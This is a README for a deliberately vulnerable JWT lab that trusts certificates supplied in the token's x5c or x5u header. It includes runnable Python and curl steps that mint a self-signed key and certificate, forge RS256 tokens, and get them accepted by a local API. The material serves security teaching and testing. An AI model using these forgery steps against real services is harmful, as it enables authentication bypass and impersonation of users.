# JWT x5c/x5u Header Injection

This challenge demonstrates a JWT implementation that trusts certificate material supplied directly in the token header instead of validating it against a pinned certificate or keystore. The `x5c` header (RFC 7515 §4.1.6) can embed a self-signed certificate chain; the `x5u` header can point to an attacker-hosted certificate URL. The API extracts whichever public key it finds there and uses it to "verify" the token's own signature — an attacker who mints their own key pair and certificate controls the keys used to validate their own forged token.

## How to run it

```bash
go run main.go serve
```

This starts the vulnerable API on port 8080. The legit token flow embeds the server's own self-signed certificate in the `x5c` header, which the API also happens to accept — because it accepts *any* certificate presented in the header.

## How to exploit it

### Via `x5c` (embedded self-signed cert chain)

```bash
# Get a sample legit token
TOKEN=$(go run main.go jwt)
curl -i http://localhost:8080/ -H "Authorization: Bearer $TOKEN"

# Forge a token: mint our own key pair + self-signed cert, embed the cert
# directly in x5c. The API trusts it with no chain-of-trust check.
python3 -c "
import base64, datetime
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import NameOID
import jwt

key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, u'attacker')])
cert = (
    x509.CertificateBuilder()
    .subject_name(name)
    .issuer_name(name)
    .public_key(key.public_key())
    .serial_number(x509.random_serial_number())
    .not_valid_before(datetime.datetime.utcnow())
    .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=1))
    .sign(key, hashes.SHA256())
)
der = cert.public_bytes(serialization.Encoding.DER)

forged = jwt.encode(
    {'sub': 'attacker'},
    key,
    algorithm='RS256',
    headers={'x5c': [base64.b64encode(der).decode()]},
)
print(forged)
" > /tmp/forged_x5c.txt

FORGED=$(cat /tmp/forged_x5c.txt)
curl -i http://localhost:8080/ -H "Authorization: Bearer $FORGED"
```

### Via `x5u` (attacker-hosted cert URL)

```bash
mkdir -p /tmp/attacker-cert && cd /tmp/attacker-cert

python3 -c "
import datetime
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import NameOID
import jwt

key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, u'attacker')])
cert = (
    x509.CertificateBuilder()
    .subject_name(name)
    .issuer_name(name)
    .public_key(key.public_key())
    .serial_number(x509.random_serial_number())
    .not_valid_before(datetime.datetime.utcnow())
    .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=1))
    .sign(key, hashes.SHA256())
)
open('cert.pem', 'wb').write(cert.public_bytes(serialization.Encoding.PEM))

forged = jwt.encode(
    {'sub': 'attacker'},
    key,
    algorithm='RS256',
    headers={'x5u': 'http://localhost:9999/cert.pem'},
)
open('forged_token.txt', 'w').write(forged)
"

# Host the cert at the URL we just claimed
python3 -m http.server 9999 &

FORGED=$(cat forged_token.txt)
curl -i http://localhost:8080/ -H "Authorization: Bearer $FORGED"
```

Either forged token is accepted (HTTP 204) because the API trusts whatever certificate the caller supplies instead of checking it against a pinned certificate or keystore.

## Disclaimer

The challenges provided in this repository are designed to be educational and for testing purposes only. Do not attempt to exploit vulnerabilities in systems or APIs without proper authorization. Always ensure that you have the necessary permissions to conduct security testing on any system or application.

---

Learn more about API security at [Cerberauth](https://www.cerberauth.com/)
